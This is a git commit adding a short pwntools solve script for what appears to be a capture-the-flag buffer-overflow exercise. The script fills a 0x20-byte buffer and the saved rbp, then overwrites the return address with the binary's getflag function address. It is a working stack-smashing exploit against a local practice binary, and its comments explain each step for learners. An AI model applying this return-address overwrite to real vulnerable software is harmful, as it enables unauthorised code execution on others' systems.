1447c660042ab3a5ca0dc2cc3d0c60ccf7b950ee
Enigmatrix <enigmatrix2000@gmail.com>
2019-08-23 21:03:09 +0800

    add bof1

---
+++ pwn/bof1/solve.py
@@ -0,0 +1,24 @@
+from pwn import *
+
+path = './bof1'
+# Open local process for debugging
+p = process(path)
+# Open the file as a ELF so that we can extract information
+# without hardcoding. e.g. we can resolve the address of getflag
+# without opening our debugger (ofc, the address will change if the binary is actually a PIE binary)
+e = ELF(path)
+
+# + 1 so that we can get rid of the stack misalignment
+getflag = e.symbols['getflag'] + 1
+
+# fill up `buf1`
+payload = 'a' * 0x20
+# fill up till you reach rbp
+payload += 'a' * 0x8
+# write to the return address
+payload += p64(getflag)
+
+p.sendline(payload)
+
+p.interactive()
+
